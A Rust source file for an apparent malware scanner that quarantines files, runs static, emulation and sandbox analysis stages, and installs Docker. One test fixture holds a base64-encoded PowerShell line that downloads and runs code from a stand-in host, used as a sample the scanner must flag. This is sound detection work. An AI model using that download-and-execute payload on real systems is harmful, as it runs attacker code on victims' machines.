use std::collections::VecDeque;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Instant;
use std::time::{SystemTime, UNIX_EPOCH};

use super::config::ScanConfig;
use super::context::ScanContext;
use super::file::{cache, discovery};
use super::heuristics;
use super::report;
use super::types::Severity;
use super::yara;

#[derive(Debug, Clone, Copy)]
pub struct ScanProgress {
    pub fraction: f32,
    pub stage: &'static str,
}

#[derive(Debug, Clone)]
pub struct ScanOutcome {
    pub severity: Severity,
    pub summary: String,
    pub findings: Vec<String>,
    pub original_path: PathBuf,
    pub quarantine_path: PathBuf,
    pub restored_to_original_path: bool,
    pub report_path: PathBuf,
    pub json_report: String,
    pub cache_hit: bool,
    pub rules_version: String,
}

impl ScanOutcome {
    pub fn is_safe(&self) -> bool {
        matches!(self.severity, Severity::Clean)
    }
}

#[derive(Debug, Clone)]
pub struct BatchScanResult {
    pub path: PathBuf,
    pub outcome: Result<ScanOutcome, String>,
}

pub fn run_pipeline(
    path: &str,
    config: Option<ScanConfig>,
) -> std::io::Result<(ScanContext, Severity)> {
    run_pipeline_with_progress(path, config, |_| {})
}

fn run_pipeline_with_progress<F>(
    path: &str,
    config: Option<ScanConfig>,
    mut progress: F,
) -> std::io::Result<(ScanContext, Severity)>
where
    F: FnMut(ScanProgress),
{
    let mut ctx = ScanContext::from_path(path, config.unwrap_or_default())?;
    if ctx.input_truncated {
        ctx.log_event(
            "pipeline",
            format!(
                "Input capped at {} of {} bytes to stay within memory limits",
                ctx.bytes.len(),
                ctx.original_size_bytes
            ),
        );
    }
    let total_steps = pipeline_step_count(&ctx.config);
    let mut completed_steps = 0usize;
    ctx.log_event(
        "pipeline",
        format!("Starting scan for {}", ctx.input_path.display()),
    );
    ctx.rules_version = yara::compiler::current_rule_version();

    advance_progress(
        &mut progress,
        &mut completed_steps,
        total_steps,
        "Checking fingerprint cache",
    );
    let cache_key = cache::cache_key(&ctx.sha256, &ctx.config, &ctx.rules_version);
    if let Some(cached) = cache::load(&cache_key) {
        let severity = cache::apply(&mut ctx, &cache_key, cached);
        report::run(&ctx, severity);
        return Ok((ctx, severity));
    }
    ctx.cache = Some(super::types::CacheMetadata {
        key: cache_key.clone(),
        hit: false,
        rules_version: ctx.rules_version.clone(),
    });

    if ctx.config.features.enable_file_checks {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Profiling file",
            super::file::run,
        );
    }

    run_stage(
        &mut ctx,
        &mut progress,
        &mut completed_steps,
        total_steps,
        "Building views",
        super::views::run,
    );

    if ctx.config.features.enable_string_extraction {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Extracting strings",
            super::strings::run,
        );
    }

    if ctx.config.features.enable_normalization {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Normalizing text",
            super::normalize::run,
        );
    }

    if ctx.config.features.enable_decode {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Decoding content",
            super::decode::run,
        );
    }

    if ctx.config.features.enable_script_parsing {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Checking scripts",
            super::script::run,
        );
    }

    if ctx.config.features.enable_format_analysis {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Inspecting formats",
            super::format::run,
        );
    }

    if ctx.config.features.enable_yara {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Running signatures",
            super::yara::run,
        );
    }

    if ctx.config.features.enable_emulation {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Running lightweight emulation",
            crate::emulation::run,
        );
    }

    run_stage(
        &mut ctx,
        &mut progress,
        &mut completed_steps,
        total_steps,
        "Preparing sandbox plan",
        crate::sandbox::plan_for_context,
    );

    if ctx.config.features.enable_dynamic_sandbox {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Running sandbox detonation",
            crate::sandbox::execute_for_context,
        );
    }

    if ctx.config.features.enable_ml_scoring {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Scoring ML features",
            crate::ml::run,
        );
    }

    advance_progress(
        &mut progress,
        &mut completed_steps,
        total_steps,
        "Scoring findings",
    );
    let scoring_started = Instant::now();
    let severity = heuristics::run(&mut ctx);
    ctx.record_stage_timing(
        "Scoring findings",
        scoring_started.elapsed().as_millis() as u64,
    );
    ctx.log_event(
        "pipeline",
        format!(
            "Finished scoring with {:?} severity and {} findings",
            severity,
            ctx.findings.len()
        ),
    );
    let _ = cache::store(&cache_key, &ctx, severity);
    progress(ScanProgress {
        fraction: 1.0,
        stage: "Writing report",
    });
    report::run(&ctx, severity);

    Ok((ctx, severity))
}

pub fn ensure_docker() -> Result<(), String> {
    if is_docker_running() {
        println!("Docker is already running.");
        return Ok(());
    }

    if is_docker_installed() {
        println!("Docker is installed but not running, starting it...");
        return start_docker();
    }

    let auto_install = std::env::var("PROJECTX_AUTO_INSTALL_DOCKER")
        .ok()
        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
        .unwrap_or(false);

    if !auto_install {
        return Err(
            "Docker not found. Install Docker manually or set PROJECTX_AUTO_INSTALL_DOCKER=1"
                .to_string(),
        );
    }

    println!("Docker not found, installing...");
    install_docker()
}

pub fn ensure_ubuntu_image() -> Result<(), String> {
    println!("Checking for Ubuntu image...");
    let output = Command::new("docker")
        .args(["image", "inspect", "ubuntu:22.04"])
        .output()
        .map_err(|e| format!("Failed to run docker: {}", e))?;

    if !output.status.success() {
        println!("Pulling ubuntu:22.04...");
        let status = Command::new("docker")
            .args(["pull", "ubuntu:22.04"])
            .status()
            .map_err(|e| format!("Failed to pull Ubuntu image: {}", e))?;
        if !status.success() {
            return Err(format!(
                "docker pull ubuntu:22.04 failed with status {}",
                status
            ));
        }
    } else {
        println!("Ubuntu image already present.");
    }
    Ok(())
}

pub fn init_quarantine() -> Result<(), String> {
    let path = Path::new("quarantine");
    if !path.exists() {
        fs::create_dir(path).map_err(|e| format!("Failed to create quarantine folder: {}", e))?;
    }
    Ok(())
}

pub fn scan_path(file_path: &str, config: Option<ScanConfig>) -> Result<ScanOutcome, String> {
    scan_path_with_progress(file_path, config, |_| {})
}

pub fn scan_path_with_progress<F>(
    file_path: &str,
    config: Option<ScanConfig>,
    mut progress: F,
) -> Result<ScanOutcome, String>
where
    F: FnMut(ScanProgress),
{
    init_quarantine()?;
    progress(ScanProgress {
        fraction: 0.0,
        stage: "Preparing scan",
    });

    let source = Path::new(file_path);
    if !source.is_file() {
        return Err(format!("Not a file: {}", file_path));
    }

    let original_permissions = fs::metadata(source)
        .map(|metadata| metadata.permissions())
        .ok();
    let already_quarantined = is_in_quarantine(source);
    progress(ScanProgress {
        fraction: 0.08,
        stage: if already_quarantined {
            "Using quarantined copy"
        } else {
            "Quarantining file"
        },
    });
    let quarantine_path = if already_quarantined {
        source.to_path_buf()
    } else {
        quarantine_file(source).map_err(|e| format!("Failed to quarantine file: {}", e))?
    };

    let pipeline_path = quarantine_path
        .to_str()
        .ok_or_else(|| "Quarantine path is not valid UTF-8".to_string())?;

    let (mut ctx, severity) = match run_pipeline_with_progress(pipeline_path, config, |update| {
        progress(ScanProgress {
            fraction: 0.12 + update.fraction * 0.78,
            stage: update.stage,
        });
    }) {
        Ok(result) => result,
        Err(error) => {
            if !already_quarantined {
                let _ = release_file(&quarantine_path, source, original_permissions.as_ref());
            }
            return Err(format!("Static analysis failed: {}", error));
        }
    };

    let findings = ctx
        .findings
        .iter()
        .map(report::finding::format_line)
        .collect::<Vec<_>>();
    let mut summary = report::summary::build(&ctx, severity);
    let is_safe = matches!(severity, Severity::Clean);
    let mut restored_to_original_path = false;

    if is_safe && !already_quarantined {
        progress(ScanProgress {
            fraction: 0.94,
            stage: "Restoring clean file",
        });
        match release_file(&quarantine_path, source, original_permissions.as_ref()) {
            Ok(()) => {
                restored_to_original_path = true;
            }
            Err(error) => {
                let restore_error = format!(
                    "Failed to restore file after scan: {}",
                    describe_restore_error(source, &error)
                );
                summary.push_str(" | ");
                summary.push_str(&restore_error);
                ctx.log_event("quarantine", restore_error);
            }
        }
    }

    ctx.log_event(
        "quarantine",
        if restored_to_original_path {
            format!("Restored clean file to {}", source.display())
        } else if already_quarantined {
            format!(
                "Analyzed existing quarantined file {}",
                quarantine_path.display()
            )
        } else {
            format!(
                "Retained file in quarantine at {}",
                quarantine_path.display()
            )
        },
    );

    let (json_report, report_path) = report::persist(
        &ctx,
        severity,
        source,
        &quarantine_path,
        restored_to_original_path,
    )?;

    progress(ScanProgress {
        fraction: 1.0,
        stage: if is_safe {
            "Scan complete"
        } else {
            "File retained in quarantine"
        },
    });

    Ok(ScanOutcome {
        severity,
        summary,
        findings,
        original_path: source.to_path_buf(),
        quarantine_path,
        restored_to_original_path,
        report_path,
        json_report,
        cache_hit: ctx.cache.as_ref().map(|cache| cache.hit).unwrap_or(false),
        rules_version: ctx.rules_version,
    })
}

pub fn scan_file(file_path: &str) -> bool {
    scan_path(file_path, None)
        .map(|outcome| outcome.is_safe())
        .unwrap_or(false)
}

pub fn restore_quarantined_file(quarantine_path: &str, original_path: &str) -> Result<(), String> {
    let quarantine_path = Path::new(quarantine_path);
    let original_path = Path::new(original_path);
    if !quarantine_path.is_file() {
        return Err(format!(
            "Quarantined file not found: {}",
            quarantine_path.display()
        ));
    }

    release_file(quarantine_path, original_path, None).map_err(|e| {
        format!(
            "Failed to restore file: {}",
            describe_restore_error(original_path, &e)
        )
    })
}

pub fn delete_quarantined_file(quarantine_path: &str) -> Result<(), String> {
    let quarantine_path = Path::new(quarantine_path);
    if !quarantine_path.exists() {
        return Err(format!(
            "Quarantined file not found: {}",
            quarantine_path.display()
        ));
    }

    fs::remove_file(quarantine_path).map_err(|e| format!("Failed to delete file: {}", e))
}

pub fn collect_scan_inputs(inputs: &[PathBuf], max_files: usize) -> Vec<PathBuf> {
    discovery::collect_files(inputs, max_files)
        .into_iter()
        .map(|item| item.path)
        .collect()
}

pub fn scan_inputs_parallel(
    inputs: &[PathBuf],
    config: Option<ScanConfig>,
    worker_count: Option<usize>,
    max_files: usize,
) -> Vec<BatchScanResult> {
    let discovered = discovery::collect_files(inputs, max_files);
    let paths = discovered
        .into_iter()
        .map(|item| item.path)
        .collect::<Vec<_>>();
    scan_paths_parallel(paths, config, worker_count)
}

pub fn scan_paths_parallel(
    paths: Vec<PathBuf>,
    config: Option<ScanConfig>,
    worker_count: Option<usize>,
) -> Vec<BatchScanResult> {
    if paths.is_empty() {
        return Vec::new();
    }

    let workers = worker_count
        .filter(|count| *count > 0)
        .unwrap_or_else(default_worker_count)
        .min(paths.len().max(1));
    let queue = Arc::new(Mutex::new(
        paths
            .into_iter()
            .enumerate()
            .collect::<VecDeque<(usize, PathBuf)>>(),
    ));
    let results = Arc::new(Mutex::new(Vec::<(usize, BatchScanResult)>::new()));
    let mut handles = Vec::new();

    for _ in 0..workers {
        let queue = Arc::clone(&queue);
        let results = Arc::clone(&results);
        let config = config.clone();
        handles.push(thread::spawn(move || loop {
            let next = {
                let mut guard = match queue.lock() {
                    Ok(guard) => guard,
                    Err(_) => return,
                };
                guard.pop_front()
            };

            let Some((index, path)) = next else {
                return;
            };

            let outcome = match path.to_str() {
                Some(path_str) => scan_path(path_str, config.clone()),
                None => Err("Path is not valid UTF-8".to_string()),
            };
            if let Ok(mut guard) = results.lock() {
                guard.push((index, BatchScanResult { path, outcome }));
            }
        }));
    }

    for handle in handles {
        let _ = handle.join();
    }

    let mut final_results = results
        .lock()
        .map(|guard| guard.clone())
        .unwrap_or_default();
    final_results.sort_by_key(|(index, _)| *index);
    final_results
        .into_iter()
        .map(|(_, result)| result)
        .collect()
}

fn quarantine_file(source: &Path) -> Result<PathBuf, std::io::Error> {
    let file_name = source.file_name().ok_or_else(|| {
        std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid file path")
    })?;

    let quarantine_path = unique_quarantine_path(file_name);
    move_or_copy(source, &quarantine_path)?;
    tighten_permissions(&quarantine_path)?;

    eprintln!("File quarantined: {}", quarantine_path.display());
    Ok(quarantine_path)
}

fn release_file(
    quarantine_path: &Path,
    original_path: &Path,
    original_permissions: Option<&fs::Permissions>,
) -> Result<(), std::io::Error> {
    if let Some(parent) = original_path.parent() {
        fs::create_dir_all(parent)?;
    }

    move_or_copy(quarantine_path, original_path)?;
    if let Some(permissions) = original_permissions {
        fs::set_permissions(original_path, permissions.clone())?;
    }

    eprintln!("File released from quarantine: {}", original_path.display());
    Ok(())
}

fn describe_restore_error(original_path: &Path, error: &std::io::Error) -> String {
    if error.kind() == std::io::ErrorKind::PermissionDenied {
        let path_text = original_path.display().to_string();
        if path_text.starts_with("/Applications/")
            || path_text.starts_with("/System/")
            || path_text.starts_with("/Library/")
        {
            return format!(
                "{}. macOS is blocking writes into a protected application/system location ({path_text}). \
Grant Full Disk Access and use an elevated move if you really intend to modify that app bundle, or restore the file to a user-writable folder instead.",
                error
            );
        }

        return format!(
            "{}. The destination is not writable for the current process ({path_text}). Check folder ownership, app permissions, or Full Disk Access.",
            error
        );
    }

    error.to_string()
}

fn move_or_copy(source: &Path, destination: &Path) -> Result<(), std::io::Error> {
    if let Some(parent) = destination.parent() {
        fs::create_dir_all(parent)?;
    }

    match fs::rename(source, destination) {
        Ok(()) => Ok(()),
        Err(_) => {
            fs::copy(source, destination)?;
            fs::remove_file(source)?;
            Ok(())
        }
    }
}

fn tighten_permissions(path: &Path) -> Result<(), std::io::Error> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(path)?.permissions();
        perms.set_mode(0o600);
        fs::set_permissions(path, perms)?;
    }

    #[cfg(not(unix))]
    let _ = path;

    Ok(())
}

fn unique_quarantine_path(file_name: &std::ffi::OsStr) -> PathBuf {
    let name = file_name.to_string_lossy();
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_millis())
        .unwrap_or(0);

    Path::new("quarantine").join(format!("{timestamp}_{name}"))
}

fn is_in_quarantine(path: &Path) -> bool {
    path.components()
        .any(|component| component.as_os_str() == "quarantine")
}

fn pipeline_step_count(config: &ScanConfig) -> usize {
    1 + usize::from(config.features.enable_file_checks)
        + 1
        + usize::from(config.features.enable_string_extraction)
        + usize::from(config.features.enable_normalization)
        + usize::from(config.features.enable_decode)
        + usize::from(config.features.enable_script_parsing)
        + usize::from(config.features.enable_format_analysis)
        + usize::from(config.features.enable_yara)
        + usize::from(config.features.enable_emulation)
        + 1
        + usize::from(config.features.enable_dynamic_sandbox)
        + usize::from(config.features.enable_ml_scoring)
        + 1
}

fn run_stage<FProgress, FStage>(
    ctx: &mut ScanContext,
    progress: &mut FProgress,
    completed_steps: &mut usize,
    total_steps: usize,
    stage: &'static str,
    operation: FStage,
) where
    FProgress: FnMut(ScanProgress),
    FStage: FnOnce(&mut ScanContext),
{
    let fraction = *completed_steps as f32 / total_steps as f32;
    progress(ScanProgress { fraction, stage });
    let started = Instant::now();
    operation(ctx);
    let elapsed = started.elapsed().as_millis() as u64;
    ctx.record_stage_timing(stage, elapsed);
    ctx.log_event(stage, format!("Completed in {} ms", elapsed));
    *completed_steps += 1;
}

fn advance_progress<FProgress>(
    progress: &mut FProgress,
    completed_steps: &mut usize,
    total_steps: usize,
    stage: &'static str,
) where
    FProgress: FnMut(ScanProgress),
{
    let fraction = *completed_steps as f32 / total_steps as f32;
    progress(ScanProgress { fraction, stage });
    *completed_steps += 1;
}

fn default_worker_count() -> usize {
    thread::available_parallelism()
        .map(|parallelism| parallelism.get())
        .unwrap_or(2)
}

#[allow(clippy::items_after_test_module)]
#[cfg(test)]
mod tests {
    use std::time::{SystemTime, UNIX_EPOCH};

    use crate::r#static::config::ScanConfig;

    use super::scan_path;

    fn unique_temp_path(prefix: &str) -> std::path::PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|duration| duration.as_nanos())
            .unwrap_or(0);
        std::env::temp_dir().join(format!("{prefix}_{nanos}.txt"))
    }

    #[test]
    fn clean_files_are_restored_after_scan() {
        let path = unique_temp_path("projectx_clean_scan");
        std::fs::write(&path, "hello world").unwrap();

        let outcome = scan_path(path.to_str().unwrap(), Some(ScanConfig::default())).unwrap();

        assert!(outcome.is_safe());
        assert!(path.exists());

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn suspicious_files_remain_quarantined() {
        let path = unique_temp_path("projectx_suspicious_scan");
        std::fs::write(
            &path,
            "aWV4IChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL2V2aWwuZXhhbXBsZScp",
        )
        .unwrap();

        let outcome = scan_path(path.to_str().unwrap(), Some(ScanConfig::default())).unwrap();

        assert!(!outcome.is_safe());
        assert!(!path.exists());
        assert!(outcome.quarantine_path.exists());

        let _ = std::fs::remove_file(outcome.quarantine_path);
    }
}

fn is_docker_running() -> bool {
    Command::new("docker")
        .arg("info")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn is_docker_installed() -> bool {
    #[cfg(target_os = "macos")]
    {
        return Command::new("colima")
            .arg("--version")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
    }

    #[cfg(target_os = "linux")]
    {
        return Command::new("docker")
            .arg("--version")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
    }

    #[cfg(target_os = "windows")]
    {
        return Command::new("wsl")
            .args(["--list", "--running"])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
    }

    #[allow(unreachable_code)]
    false
}

fn start_docker() -> Result<(), String> {
    #[cfg(target_os = "macos")]
    {
        println!("Starting Colima...");
        let status = Command::new("colima")
            .arg("start")
            .status()
            .map_err(|e| format!("Failed to start Colima: {}", e))?;
        if !status.success() {
            return Err(format!(
                "Failed to start Colima (exit status: {}). Please check Colima permissions/config.",
                status
            ));
        }

        return wait_for_docker();
    }

    #[cfg(target_os = "linux")]
    {
        println!("Starting Docker service...");
        let status = Command::new("sudo")
            .args(["systemctl", "start", "docker"])
            .status()
            .map_err(|e| format!("Failed to start Docker service: {}", e))?;
        if !status.success() {
            return Err(format!(
                "Failed to start Docker service (exit status: {}).",
                status
            ));
        }

        return wait_for_docker();
    }

    #[cfg(target_os = "windows")]
    {
        println!("Starting Docker in WSL2...");
        let status = Command::new("wsl")
            .args(["-e", "sudo", "service", "docker", "start"])
            .status()
            .map_err(|e| format!("Failed to start Docker in WSL2: {}", e))?;
        if !status.success() {
            return Err(format!(
                "Failed to start Docker in WSL2 (exit status: {}).",
                status
            ));
        }

        return wait_for_docker();
    }

    #[allow(unreachable_code)]
    Ok(())
}

fn install_docker() -> Result<(), String> {
    #[cfg(target_os = "macos")]
    {
        if !is_brew_installed() {
            println!("Installing Homebrew...");
            let status = Command::new("bash")
                .args([
                    "-c",
                    "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
                ])
                .status()
                .map_err(|e| format!("Failed to install Homebrew: {}", e))?;
            if !status.success() {
                return Err(format!(
                    "Failed to install Homebrew (exit status: {}).",
                    status
                ));
            }
        }

        println!("Installing Colima and Docker CLI...");
        let status = Command::new("brew")
            .args(["install", "colima", "docker"])
            .status()
            .map_err(|e| format!("Failed to install Colima and Docker: {}", e))?;
        if !status.success() {
            return Err(format!(
                "Failed to install Colima and Docker (exit status: {}).",
                status
            ));
        }

        return start_docker();
    }

    #[cfg(target_os = "linux")]
    {
        println!("Installing Docker Engine...");
        let status = Command::new("bash")
            .args(["-c", "curl -fsSL https://get.docker.com | sh"])
            .status()
            .map_err(|e| format!("Failed to install Docker: {}", e))?;
        if !status.success() {
            return Err(format!(
                "Failed to install Docker (exit status: {}).",
                status
            ));
        }

        let user = std::env::var("USER").unwrap_or_default();
        let status = Command::new("sudo")
            .args(["usermod", "-aG", "docker", &user])
            .status()
            .map_err(|e| format!("Failed to add user to docker group: {}", e))?;
        if !status.success() {
            return Err(format!(
                "Failed to add user to docker group (exit status: {}).",
                status
            ));
        }

        return start_docker();
    }

    #[cfg(target_os = "windows")]
    {
        println!("Enabling WSL2...");
        let status = Command::new("powershell")
            .args(["-Command", "wsl --install --no-distribution"])
            .status()
            .map_err(|e| format!("Failed to enable WSL2: {}", e))?;
        if !status.success() {
            return Err(format!("Failed to enable WSL2 (exit status: {}).", status));
        }

        println!("Installing Ubuntu in WSL2...");
        let status = Command::new("powershell")
            .args(["-Command", "wsl --install -d Ubuntu"])
            .status()
            .map_err(|e| format!("Failed to install Ubuntu in WSL2: {}", e))?;
        if !status.success() {
            return Err(format!(
                "Failed to install Ubuntu in WSL2 (exit status: {}).",
                status
            ));
        }

        println!("Installing Docker Engine inside WSL2...");
        let status = Command::new("wsl")
            .args(["-e", "bash", "-c", "curl -fsSL https://get.docker.com | sh"])
            .status()
            .map_err(|e| format!("Failed to install Docker in WSL2: {}", e))?;
        if !status.success() {
            return Err(format!(
                "Failed to install Docker in WSL2 (exit status: {}).",
                status
            ));
        }

        let status = Command::new("wsl")
            .args(["-e", "bash", "-c", "sudo usermod -aG docker $USER"])
            .status()
            .map_err(|e| format!("Failed to add user to docker group in WSL2: {}", e))?;
        if !status.success() {
            return Err(format!(
                "Failed to add user to docker group in WSL2 (exit status: {}).",
                status
            ));
        }

        return start_docker();
    }

    #[allow(unreachable_code)]
    Ok(())
}

fn wait_for_docker() -> Result<(), String> {
    println!("Waiting for Docker to be ready...");
    for _ in 0..30 {
        std::thread::sleep(std::time::Duration::from_secs(2));
        if is_docker_running() {
            println!("Docker is ready.");
            return Ok(());
        }
    }
    Err("Docker took too long to start, please try again.".to_string())
}

#[cfg(target_os = "macos")]
fn is_brew_installed() -> bool {
    Command::new("brew")
        .arg("--version")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}
